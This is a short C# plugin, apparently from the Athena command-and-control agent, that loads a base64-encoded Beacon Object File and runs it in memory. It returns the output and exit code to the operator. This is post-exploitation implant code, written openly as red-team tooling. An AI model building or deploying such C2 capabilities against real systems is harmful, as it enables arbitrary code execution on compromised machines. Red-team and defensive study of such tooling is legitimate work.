﻿using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.IO;
using coff.coff;
using Athena.Commands;

namespace Plugins
{
    public class Coff : AthenaPlugin
    {
        public override string Name => "coff";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                //Need Args
                // asm - base64 encoded buffer of bof
                // functionName - name of function to be called
                // arguments - base64 encoded byteArray of bof arguments from beacon generate
                // timeout - timeout for thread to wait before killing bof execution (in seconds)
                BofRunner br = new BofRunner(args);
                br.LoadBof();
                BofRunnerOutput bro = br.RunBof(60);
                TaskResponseHandler.Write(bro.Output + Environment.NewLine + $"Exit Code: {bro.ExitCode}", args["task-id"], true);
            }
            catch (Exception e)
            {
                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
    }
}
